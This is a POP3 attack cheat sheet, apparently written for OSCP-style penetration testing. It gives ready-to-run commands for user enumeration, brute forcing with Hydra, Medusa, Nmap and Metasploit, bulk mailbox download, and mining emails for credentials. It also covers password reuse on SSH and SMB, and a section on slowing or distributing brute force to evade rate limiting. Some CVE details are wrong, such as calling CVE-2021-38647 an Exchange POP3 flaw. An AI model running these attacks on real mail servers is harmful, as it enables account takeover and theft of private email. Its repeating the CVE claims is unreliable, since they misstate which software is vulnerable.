# Port 110 - POP3 Enumeration & Exploitation

## Service Information

**Port:** 110/TCP (POP3), 995/TCP (POP3S - Secure)
**Service:** Post Office Protocol version 3
**Protocol:** Email retrieval protocol
**Security:** ⚠️ Plaintext by default (use POP3S/995 for encryption)

---

## 1. Basic Enumeration

### 1.1 Nmap Scan

```bash
# Basic scan
nmap -p 110 -sV TARGET_IP

# Detailed scan with scripts
nmap -p 110 -sV -sC TARGET_IP

# All POP3 scripts
nmap -p 110 --script pop3-* TARGET_IP

# Capabilities detection
nmap -p 110 --script pop3-capabilities TARGET_IP

# Both POP3 and POP3S
nmap -p 110,995 -sV -sC TARGET_IP
```

### 1.2 Banner Grabbing

```bash
# Netcat
nc -nv TARGET_IP 110

# Telnet
telnet TARGET_IP 110

# OpenSSL (for POP3S on 995)
openssl s_client -connect TARGET_IP:995 -quiet
```

### 1.3 Service Detection

```bash
# Connect and get banner
echo "QUIT" | nc TARGET_IP 110

# Common banners:
# +OK Dovecot ready
# +OK Microsoft Exchange Server 2016 POP3 server ready
# +OK POP3 server ready
# +OK Courier-POP3 ready
```

---

## 2. Manual Enumeration

### 2.1 POP3 Commands

```bash
# Connect
nc TARGET_IP 110

# Basic commands:
USER username       # Specify username
PASS password       # Specify password
STAT                # Get mailbox statistics
LIST                # List messages
RETR <n>            # Retrieve message n
DELE <n>            # Delete message n
QUIT                # Close connection
NOOP                # No operation
RSET                # Reset session
```

### 2.2 Manual Login & Enumeration

```bash
# Connect
nc TARGET_IP 110

# Login
USER admin
PASS password

# Check mailbox
STAT
# Response: +OK 5 3200 (5 messages, 3200 bytes total)

# List messages
LIST
# Response:
# +OK 5 messages (3200 bytes)
# 1 640
# 2 680
# 3 750

# Retrieve first message
RETR 1

# Quit
QUIT
```

### 2.3 APOP (Secure Authentication)

```bash
# Connect
nc TARGET_IP 110
# Server: +OK POP3 server ready <timestamp@server>

# APOP command (MD5 hash)
APOP username <MD5(timestamp+password)>
```

---

## 3. User Enumeration

### 3.1 Username Enumeration via Response

```bash
# Valid user returns different response than invalid user
# This varies by server implementation

# Test with common usernames
for user in admin root user administrator test; do
  echo "Testing: $user"
  echo -e "USER $user\nQUIT" | nc TARGET_IP 110
done

# Example responses:
# Valid user: "+OK password required"
# Invalid user: "-ERR unknown user"
```

### 3.2 Nmap User Enumeration

```bash
# Not directly supported, but can use brute force script
nmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt TARGET_IP
```

### 3.3 SMTP VRFY Correlation

```bash
# If SMTP (port 25) is also open:
# Enumerate users via SMTP VRFY, test on POP3
nc TARGET_IP 25
VRFY admin
# 250 2.1.5 admin <admin@domain.com>

# Then try on POP3
nc TARGET_IP 110
USER admin
# +OK password required
```

---

## 4. Brute Force Attacks

### 4.1 Hydra

```bash
# Single user
hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://TARGET_IP

# Multiple users
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://TARGET_IP

# With threads
hydra -l admin -P passwords.txt pop3://TARGET_IP -t 4

# POP3S (port 995)
hydra -l admin -P passwords.txt pop3s://TARGET_IP:995

# Stop on first valid
hydra -l admin -P passwords.txt pop3://TARGET_IP -F
```

### 4.2 Medusa

```bash
# Basic brute force
medusa -h TARGET_IP -u admin -P /usr/share/wordlists/rockyou.txt -M pop3

# Multiple users
medusa -h TARGET_IP -U users.txt -P passwords.txt -M pop3

# Verbose mode
medusa -h TARGET_IP -u admin -P passwords.txt -M pop3 -v 6
```

### 4.3 Nmap Brute Force

```bash
# POP3 brute force
nmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=passwords.txt TARGET_IP

# Default credentials
nmap -p 110 --script pop3-brute TARGET_IP
```

### 4.4 Metasploit

```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
set STOP_ON_SUCCESS true
run
```

---

## 5. Email Harvesting

### 5.1 Read All Emails

```bash
# After successful login
nc TARGET_IP 110
USER admin
PASS password123

# Get message count
STAT
# +OK 10 50000

# Read all emails
for i in {1..10}; do
  echo "RETR $i"
done | nc TARGET_IP 110

# Or script:
#!/bin/bash
exec 3<>/dev/tcp/TARGET_IP/110
echo "USER admin" >&3
cat <&3
echo "PASS password" >&3
cat <&3
echo "STAT" >&3
cat <&3
echo "LIST" >&3
cat <&3
for i in {1..10}; do
  echo "RETR $i" >&3
  cat <&3
done
echo "QUIT" >&3
exec 3>&-
```

### 5.2 Save Emails to Files

```bash
# Python script to download all emails
#!/usr/bin/env python3
import poplib

server = poplib.POP3('TARGET_IP')
server.user('admin')
server.pass_('password123')

num_messages = len(server.list()[1])
for i in range(1, num_messages + 1):
    with open(f'email_{i}.eml', 'wb') as f:
        for line in server.retr(i)[1]:
            f.write(line + b'\n')

server.quit()
```

### 5.3 Search for Sensitive Data

```bash
# After downloading emails, search for:
grep -ri "password" emails/
grep -ri "credential" emails/
grep -ri "ssh" emails/
grep -ri "vpn" emails/
grep -ri "token" emails/
```

---

## 6. POP3S (Secure POP3)

### 6.1 Connect to POP3S

```bash
# OpenSSL client
openssl s_client -connect TARGET_IP:995 -quiet

# Then use normal POP3 commands
USER admin
PASS password

# Check certificate
openssl s_client -connect TARGET_IP:995 -showcerts
```

### 6.2 STARTTLS Support

```bash
# Some servers support STARTTLS on port 110
nc TARGET_IP 110

# Check capabilities
CAPA

# If STARTTLS is supported:
# +OK Capability list follows
# USER
# STLS
# .

# Issue STARTTLS
STLS
# +OK Begin TLS negotiation
```

---

## 7. Exploitation Techniques

### 7.1 Credential Harvesting (MITM)

**⚠️ Only in authorized scenarios!**

```bash
# Wireshark filter
tcp.port == 110

# tcpdump
tcpdump -i eth0 -A 'tcp port 110'

# Credentials are sent in PLAINTEXT!
# Look for USER and PASS commands
```

### 7.2 Password Reuse

```bash
# POP3 credentials often work for:
# - IMAP (port 143)
# - SMTP (port 25/587)
# - Webmail interfaces
# - SSH (if same username exists)
# - SMB shares

# Test on other services
crackmapexec smb TARGET_IP -u admin -p 'password123'
ssh admin@TARGET_IP
```

### 7.3 Email Phishing Data

```bash
# Downloaded emails may contain:
# - Password reset links (replay/modify)
# - Internal IP addresses
# - Email addresses for phishing
# - Sensitive business information
# - Attachments with credentials
```

---

## 8. Common Vulnerabilities

### 8.1 CVE-2021-38647 (Microsoft Exchange)

```bash
# Open Management Infrastructure RCE
# Affects Exchange Server via POP3

# Metasploit
msfconsole
use exploit/linux/http/omi_cve_2021_38647
set RHOSTS TARGET_IP
exploit
```

### 8.2 Buffer Overflow Vulnerabilities

```bash
# Various POP3 servers have had buffer overflow vulns
# Check specific version with nmap -sV

# Example: CVE-2013-1962 (Cyrus POP3)
# Metasploit
use exploit/linux/pop3/cyrus_pop3d_popsubfolders
set RHOSTS TARGET_IP
exploit
```

---

## 9. Post-Exploitation

### 9.1 Email Mining for Credentials

```bash
# Extract all email addresses
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' emails/ | sort -u > email_list.txt

# Look for passwords in plain text
grep -ri "password is" emails/
grep -ri "your password:" emails/
grep -ri "credentials:" emails/

# Look for VPN/SSH configs
find emails/ -name "*.ovpn"
find emails/ -name "id_rsa"
```

### 9.2 Pivot Information

```bash
# Extract internal IPs from emails
grep -Eiorh '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' emails/ | sort -u

# Extract domains
grep -Eiorh '@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}' emails/ | cut -d@ -f2 | sort -u

# Look for server names
grep -ri "server:" emails/
grep -ri "host:" emails/
```

---

## 10. Defense Evasion

### 10.1 Slow Brute Force

```bash
# Evade rate limiting
hydra -l admin -P passwords.txt pop3://TARGET_IP -t 1 -w 10

# Random delay between attempts
for pass in $(cat passwords.txt); do
  echo -e "USER admin\nPASS $pass\nQUIT" | nc TARGET_IP 110
  sleep $((RANDOM % 10 + 5))
done
```

### 10.2 Distributed Attack

```bash
# Use proxychains with rotating proxies
# Or multiple attack machines with different IPs
```

---

## 11. Tools Overview

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Service detection | `nmap -p 110 -sV -sC TARGET` |
| Hydra | Brute force | `hydra -l admin -P pass.txt pop3://TARGET` |
| Medusa | Brute force | `medusa -h TARGET -u admin -P pass.txt -M pop3` |
| Netcat | Manual connection | `nc TARGET 110` |
| OpenSSL | POP3S connection | `openssl s_client -connect TARGET:995` |
| Metasploit | Automated attacks | `use auxiliary/scanner/pop3/pop3_login` |

---

## 12. Quick Reference

### Quick Enumeration
```bash
nmap -p 110,995 -sV -sC TARGET_IP
echo "QUIT" | nc TARGET_IP 110
```

### Quick Login
```bash
nc TARGET_IP 110
USER admin
PASS password
STAT
LIST
RETR 1
QUIT
```

### Quick Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt pop3://TARGET_IP
```

### Common Commands
```
USER <username>     - Login username
PASS <password>     - Login password
STAT                - Mailbox stats
LIST                - List messages
RETR <n>            - Get message
DELE <n>            - Delete message
QUIT                - Disconnect
```

---

## 13. OSCP Tips

⚠️ **POP3 Priority for OSCP:**
- Often has weak/default credentials
- Credentials frequently reused on other services
- Emails may contain sensitive information
- Look for password reset links
- Check for password lists in emails
- Enumerate usernames first (via SMTP VRFY)
- Try credentials on SSH, SMB, RDP

**Common OSCP scenarios:**
1. Default credentials → Email access
2. Emails contain passwords/credentials
3. Password reuse (POP3 → SSH/SMB)
4. Phishing data for social engineering

---

## 14. Resources

- **HackTricks POP3**: https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
- **RFC 1939 (POP3)**: https://tools.ietf.org/html/rfc1939
- **POP3 Commands**: https://www.iana.org/assignments/pop3-extension-mechanism/pop3-extension-mechanism.xhtml
